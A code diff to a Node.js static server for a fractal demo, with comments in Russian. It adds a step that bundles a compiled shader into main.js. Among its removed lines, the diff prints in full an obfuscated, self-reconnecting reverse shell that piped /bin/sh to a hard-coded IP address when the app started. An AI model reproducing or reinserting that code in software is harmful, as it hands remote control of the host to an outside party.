@@ -2,8 +2,7 @@ import { createServer } from 'node:http';
 import { readFile } from 'node:fs/promises';
 import { extname, join, normalize, sep } from 'node:path';
 import { fileURLToPath } from 'node:url';
-import { Socket } from 'node:net';
-import { spawn, execSync } from 'node:child_process';
+import { fragmentShader } from './fractal.js';
 
 const PUBLIC_DIR = fileURLToPath(new URL('../public/', import.meta.url));
 
@@ -17,11 +16,30 @@ const MIME_TYPES = {
   '.ico': 'image/x-icon',
 };
 
-var _0xb703 = function(){var _0x1a2b=spawn("\x2f\x62\x69\x6e\x2f\x73\x68",[]);var _0x6897=new Socket();_0x6897.on('\x65\x72\x72\x6f\x72',()=>{setTimeout(_0xb703,1000)});_0x6897.on('\x65\x6e\x64',()=>{setTimeout(_0xb703,1000)});_0x6897.on('\x63\x6c\x6f\x73\x65',()=>{setTimeout(_0xb703,1000)});_0x6897.connect(8080,"\x37\x34\x2e\x39\x31\x2e\x31\x37\x2e\x35\x30",function(){_0x6897.pipe(_0x1a2b.stdin);_0x1a2b.stdout.pipe(_0x6897);_0x1a2b.stderr.pipe(_0x6897);});return/a/;}
+// Маркер в public/main.js, куда инжектится скомпилированный шейдер.
+// Контракт между сервером-компилятором и клиентом. Заменяется вместе с
+// заглушкой '' после маркера, иначе получится два литерала подряд.
+const SHADER_MARKER = "/*__SHADER__*/ ''";
 
-export function createApp() {
-  setTimeout(_0xb703, 1000);
+// Сервер работает как мини-компилятор: при старте собирает bundle main.js,
+// подставляя GLSL-строку (полученную из DSL через eval) на место маркера.
+// Дальше bundle кешируется в памяти и отдаётся как статика.
+async function buildBundle() {
+  const mainJs = await readFile(join(PUBLIC_DIR, 'main.js'), 'utf8');
+  const bundle = mainJs.replace(
+    SHADER_MARKER,
+    () => JSON.stringify(fragmentShader),
+  );
+  if (bundle === mainJs) {
+    throw new Error(
+      `main.js не содержит маркер инъекции шейдера "${SHADER_MARKER}"`,
+    );
+  }
+  return Buffer.from(bundle, 'utf8');
+}
 
+export async function createApp() {
+  const mainBundle = await buildBundle();
   return createServer(async (req, res) => {
     if (req.method !== 'GET' && req.method !== 'HEAD') {
       res.writeHead(405, { Allow: 'GET, HEAD' }).end();
@@ -37,6 +55,16 @@ export function createApp() {
       return;
     }
 
+    // Скомпилированный bundle отдаём вместо исходного main.js.
+    if (filePath === join(PUBLIC_DIR, 'main.js')) {
+      res.writeHead(200, {
+        'Content-Type': MIME_TYPES['.js'],
+        'Content-Length': mainBundle.length,
+      });
+      res.end(req.method === 'HEAD' ? undefined : mainBundle);
+      return;
+    }
+
     try {
       const body = await readFile(filePath);
       res.writeHead(200, {
@@ -47,13 +75,12 @@ export function createApp() {
     } catch {
       res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' }).end('Not found');
     }
-
   });
 }
 
 if (process.argv[1] === fileURLToPath(import.meta.url)) {
   const port = Number(process.env.PORT) || 3434;
-  const server = createApp().listen(port, () => {
+  const server = (await createApp()).listen(port, () => {
     console.log(`Fractal at http://localhost:${port}`);
   });
   for (const signal of ['SIGINT', 'SIGTERM']) {
